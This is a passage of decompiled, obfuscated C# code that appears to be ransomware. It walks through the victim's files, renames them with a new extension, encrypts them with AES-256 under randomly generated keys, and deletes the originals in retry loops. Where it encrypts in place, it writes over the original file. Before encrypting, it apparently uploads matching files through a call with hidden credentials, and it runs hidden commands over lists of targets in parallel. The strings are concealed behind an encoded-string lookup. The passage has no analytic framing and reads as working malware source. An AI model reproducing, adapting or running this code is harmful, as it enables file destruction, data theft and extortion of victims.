!CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389841)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389847)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389314)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389257)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389272)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389223)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389238)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389221)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389172)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389187)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389138)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389157)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389104)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389123)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389110)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389093)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().Contains(xtcPtppfARaJuWs.getString_0(107389556)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107389571))) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389514)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107397210)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389533)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(CS_0024_003C_003E8__locals0.uYKcRkbjPyG) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(xtcPtppfARaJuWs.getString_0(107389496)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(xtcPtppfARaJuWs.getString_0(107389459)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(xtcPtppfARaJuWs.getString_0(107389454)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(xtcPtppfARaJuWs.getString_0(107389449)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(xtcPtppfARaJuWs.getString_0(107389476)) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(AlXvbFdlnNXOi) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(ZOToawIMfprr) && !CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.Contains(fnEjkTZXUzKS))
			{
				if (CS_0024_003C_003E8__locals0.odyeEpsXhVRV.Length != 0)
				{
					string[] odyeEpsXhVRV = CS_0024_003C_003E8__locals0.odyeEpsXhVRV;
					int num = 0;
					while (num < odyeEpsXhVRV.Length)
					{
						string value = odyeEpsXhVRV[num];
						if (!CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1000;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.EndsWith(CS_0024_003C_003E8__locals0.uYKcRkbjPyG))
					{
						goto IL_1000;
					}
				}
				catch (Exception)
				{
					goto IL_1000;
				}
				if (!gHJtQxzOYMxb.Contains(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx))
				{
					if (JuoxaLNRiTYHeY == xtcPtppfARaJuWs.getString_0(107396878))
					{
						try
						{
							if (CHfiOAUpccl.fhCAURzyMsnRokFU(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx))
							{
								CHfiOAUpccl.zMWyOqfMOtzftHw(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
							}
						}
						catch
						{
						}
					}
					gHJtQxzOYMxb.Add(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
					if (!mRCgNmhiRqq.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx)))
					{
						mRCgNmhiRqq.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx));
					}
					JxJsKmGJSdnj(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
					try
					{
						new tSjEsjVhFLRDyuWQ().mfWczWUMLYhnzT(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (rjVAnmtTRGwdsGoP)
								{
									Console.WriteLine(xtcPtppfARaJuWs.getString_0(107404188) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107403599) + new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length + xtcPtppfARaJuWs.getString_0(107403610));
									Console.WriteLine(xtcPtppfARaJuWs.getString_0(107403569));
								}
							}
							catch
							{
							}
							iDwobxXLVYBDUs(HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107403464)), xtcPtppfARaJuWs.getString_0(107389360) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107389360) + HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107403439)) + xtcPtppfARaJuWs.getString_0(107389360) + Environment.UserName + xtcPtppfARaJuWs.getString_0(107389360) + HnrHiFTDAEzVb(xtcPtppfARaJuWs.getString_0(107403454)));
						}
					}
					catch (Exception ex2)
					{
						if (eCrtUqxUXqEDfkG)
						{
							try
							{
								File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107403429) + ex2.Message + xtcPtppfARaJuWs.getString_0(107396281));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (eCrtUqxUXqEDfkG)
							{
								try
								{
									File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107403828) + ex4.Message + xtcPtppfARaJuWs.getString_0(107396281));
								}
								catch (Exception)
								{
								}
							}
							cMPsaAWwrrbpa++;
							goto end_IL_085c_2;
						}
						if (loDvPGrZMBwOJMj == xtcPtppfARaJuWs.getString_0(107396878) && new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length > Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
								{
									if (FjsJwHpFzPmVq)
									{
										CS_0024_003C_003E8__locals0.uYKcRkbjPyG = WxVPvEgBcYyDLSq + CS_0024_003C_003E8__locals0.uYKcRkbjPyG;
									}
									File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG);
								}
							}
							catch (Exception ex6)
							{
								if (eCrtUqxUXqEDfkG)
								{
									try
									{
										File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107403799) + ex6.Message + xtcPtppfARaJuWs.getString_0(107396281));
									}
									catch (Exception)
									{
									}
								}
								cMPsaAWwrrbpa++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
							{
								CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx += CS_0024_003C_003E8__locals0.uYKcRkbjPyG;
							}
							if (grVWpVNxmvUXt == xtcPtppfARaJuWs.getString_0(107396878))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item3 in YXlceGYDfnj)
									{
										if (CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.IkKoTnSnjIE.uYKcRkbjPyG) && BMlICsewZHNNqOZxm == xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107396884))
										{
											if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx).Length)
											{
												try
												{
													wdiXDjuJgNGJ.DCRZpKamZEizX(xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107390215), xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107390210), xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107390165), CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx.ToLower().EndsWith(item3) && BMlICsewZHNNqOZxm == xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107397044))
										{
											try
											{
												wdiXDjuJgNGJ.DCRZpKamZEizX(xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107390215), xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107390210), xtcPtppfARaJuWs.zHykNUMLBYF.getString_0(107390165), CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
							string s = gXnOfppahrNWi.sBDlGorhadqnmxr(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (dtBtLrowijPwW == xtcPtppfARaJuWs.getString_0(107397038))
							{
								byte[] array = null;
								byte[] byte_ = wZhxBLOUELLD.YyvEaXvrgGWE(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, Convert.ToInt32(ThqgRSrzuFx) * 1024 * 1024);
								if (!wZhxBLOUELLD.kFTEsbJnnwQZ(ZuPICqOHsAezK: (!JQllwusRFZbJU) ? (sFwpaHIPJDNK ? wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : wZhxBLOUELLD.TWWzYeNNrdZT(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (sFwpaHIPJDNK ? eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : eihvGbfwnIee.kXimjkJppApPOW(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.rlUOZBzOokWP), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), lMQywbZRpEOBbR: CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, iPDawhgBDCF: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!sFwpaHIPJDNK)
							{
								if (!eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, ThqgRSrzuFx, CS_0024_003C_003E8__locals0.rlUOZBzOokWP))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!eQDWwInDCVt.MzXnLHyJOA(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, ThqgRSrzuFx, text, bytes))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (FjsJwHpFzPmVq)
							{
								CS_0024_003C_003E8__locals0.uYKcRkbjPyG = WxVPvEgBcYyDLSq + CS_0024_003C_003E8__locals0.uYKcRkbjPyG;
							}
							string text2 = VEEBlwVfMrF.psRYhOyItCIDHrZ(32);
							string s2 = gXnOfppahrNWi.sBDlGorhadqnmxr(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
							{
								if (!lLDISlXAEBoGjsf)
								{
									if (!sFwpaHIPJDNK)
									{
										nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, FlUpRKIMpc);
									}
									else
									{
										nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, Encoding.ASCII.GetBytes(text2));
									}
								}
								else
								{
									try
									{
										if (!sFwpaHIPJDNK)
										{
											nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, FlUpRKIMpc);
										}
										else
										{
											nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, Encoding.ASCII.GetBytes(text2));
										}
									}
									catch (Exception ex11)
									{
										if (eCrtUqxUXqEDfkG)
										{
											try
											{
												File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107386836) + ex11.Message + xtcPtppfARaJuWs.getString_0(107396281));
											}
											catch (Exception)
											{
											}
										}
										cMPsaAWwrrbpa++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!lLDISlXAEBoGjsf)
							{
								if (!sFwpaHIPJDNK)
								{
									nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107386877), FlUpRKIMpc);
								}
								else
								{
									nIyfuHCZss(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107386877), Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!sFwpaHIPJDNK)
									{
										nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, FlUpRKIMpc);
									}
									else
									{
										nOFFyaCnYAwSb(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex14)
								{
									if (eCrtUqxUXqEDfkG)
									{
										try
										{
											File.AppendAllText(ZOToawIMfprr, xtcPtppfARaJuWs.getString_0(107386617) + CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + xtcPtppfARaJuWs.getString_0(107386836) + ex14.Message + xtcPtppfARaJuWs.getString_0(107396281));
										}
										catch (Exception)
										{
										}
									}
									cMPsaAWwrrbpa++;
									return;
								}
							}
							if (sFwpaHIPJDNK)
							{
								if (CS_0024_003C_003E8__locals0.uYKcRkbjPyG != xtcPtppfARaJuWs.getString_0(107386882))
								{
									dnVJbaOwGkkjKGJ(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx + CS_0024_003C_003E8__locals0.uYKcRkbjPyG, bytes2);
								}
								else
								{
									dnVJbaOwGkkjKGJ(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx, bytes2);
								}
							}
						}
						end_IL_085c_2:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1000;
			IL_1000:
			CS_0024_003C_003E8__locals0.wNdNDiAzKQBqV.Remove(CS_0024_003C_003E8__locals0.gfQBDTGvKHrdbzdx);
		});
	}

	private static void sxtvKjJmiNU(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (grVWpVNxmvUXt == getString_0(107396857))
					{
						foreach (string item in YXlceGYDfnj)
						{
							if (string_0.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107396857))
							{
								if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107397017))
							{
								try
								{
									wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107386856)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107386856), getString_0(107390075)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void nOFFyaCnYAwSb(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			if (grVWpVNxmvUXt == getString_0(107396857))
			{
				FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
				foreach (string item in YXlceGYDfnj)
				{
					if (string_0.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107396857))
					{
						if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > fileStream.Length)
						{
							try
							{
								wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), string_0);
							}
							catch
							{
							}
						}
					}
					else if (string_0.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107397017))
					{
						try
						{
							wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), string_0);
						}
						catch
						{
						}
					}
				}
				fileStream.Dispose();
			}
		}
		catch
		{
		}
		if (string_0 != string_1)
		{
			File.Move(string_0, string_1);
			string_0 = string_1;
		}
		byte[] bytes = eihvGbfwnIee.kXimjkJppApPOW(File.ReadAllBytes(string_0), byte_0, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(string_0, bytes);
		ureUqQkXCPeI++;
	}

	private static void nIyfuHCZss(string string_0, string string_1, byte[] byte_0)
	{
		SNppjQiTBFc CS_0024_003C_003E8__locals0 = new SNppjQiTBFc();
		CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY = string_0;
		CS_0024_003C_003E8__locals0.iHCToHaiMkWdn = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string iHCToHaiMkWdn = CS_0024_003C_003E8__locals0.iHCToHaiMkWdn;
			FileStream fileStream = new FileStream(iHCToHaiMkWdn, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (ucHAaUvpilVt == getString_0(107396857))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.iHCToHaiMkWdn.Length > 0)
				{
					if (grVWpVNxmvUXt == getString_0(107396857))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in YXlceGYDfnj)
						{
							if (CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107396857))
							{
								if (Convert.ToInt32(RVYOolFtuFdobqh) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY.ToLower().EndsWith(item) && BMlICsewZHNNqOZxm == getString_0(107397017))
							{
								try
								{
									wdiXDjuJgNGJ.DCRZpKamZEizX(getString_0(107390188), getString_0(107390183), getString_0(107390138), CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.iHCToHaiMkWdn.EndsWith(getString_0(107386856)))
					{
						File.Move(CS_0024_003C_003E8__locals0.iHCToHaiMkWdn, CS_0024_003C_003E8__locals0.iHCToHaiMkWdn.Replace(getString_0(107386856), getString_0(107390075)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.iHCToHaiMkWdn))
							{
								File.Delete(CS_0024_003C_003E8__locals0.iHCToHaiMkWdn);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception ex2)
		{
			if (eCrtUqxUXqEDfkG)
			{
				try
				{
					File.AppendAllText(ZOToawIMfprr, getString_0(107386596) + CS_0024_003C_003E8__locals0.VzCpOSPDVzMkY + getString_0(107386815) + ex2.Message + getString_0(107396260));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	private static void _003CMain_003Eb__9()
	{
		List<string> source = oZUWRutzOXWA;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
			{
				iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386794)), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		List<string> source2 = swPjvwMqhDoflU;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386749)), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		if (ObnKcCkHcytzR == getString_0(107396857))
		{
			string[] source3 = nAfCNlgUUqDMMcw;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
				{
					iDwobxXLVYBDUs(HnrHiFTDAEzVb(getString_0(107386749)), getString_0(107386756) + string_0 + getString_0(107386203));
				};
			}
			Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		}
		if (!swuZnlPkVSzF().Contains(getString_0(107386942)))
		{
			ppBucnmnAMy(NCHqCgWFctjH);
		}
		else
		{
			List<string> tKVaNAxtSvsgMn = TKVaNAxtSvsgMn;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
				{
					iDwobxXLVYBDUs(HnrHiFTDAEzVb(zwAdSSSqsokmWfX(getString_0(107386198))), string_0);
				};
			}
			Parallel.ForEach(tKVaNAxtSvsgMn, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
		}
		List<string> cVIVuAHJiUyCCD = CVIVuAHJiUyCCD;
